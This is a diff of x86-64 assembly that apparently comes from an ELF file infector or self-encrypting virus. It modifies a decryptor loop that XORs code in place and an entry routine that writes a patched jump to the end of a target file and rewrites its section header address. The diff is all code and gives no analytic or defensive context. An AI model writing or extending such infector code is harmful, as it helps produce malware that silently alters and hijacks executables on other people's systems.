@@ -29,13 +29,13 @@ decryptor:
   mov r10, [rbp + section_size - v_stop + _start + 3]
   mov r11, [rbp + code_offset - v_stop + _start + 3]
 
-  ; lea rsi, [rbp + r11]
-  mov rsi, r11
+  lea rsi, [rel decryptor]
+  sub rsi, r11
   .while_decrypt:
     cmp r10, 8
     jle .decrypt_bytes
 
-      .decrypt_chunk:
+    .decrypt_chunk:
       xor [rsi], r9
       add rsi, 8
       sub r10, 8
@@ -568,11 +568,13 @@ _start:
     add rdx, JMP_REL_SIZE ; add size of jmp rel instruction
     sub r14, rdx ; scott
     sub r14, _start - decryptor ; scott
-    mov rdi, r14
-    ; add rdi, [r15 + SH_ADDRESS]
-    ; mov [r15 + SH_ADDRESS], rdi
     mov byte [r15 + JMP_REL], 0xe9 ; jmp instruction
     mov dword [r15 + JMP_REL + 1], r14d
+
+    ; patched section header address
+    mov r14, [r15 + EHDR_ENTRY]
+    sub r14, [r15 + SH_ADDRESS]
+    mov [r15 + SH_ADDRESS], r14
 
     ; Write patched jmp to EOF
     mov rdi, r9 ; load fd
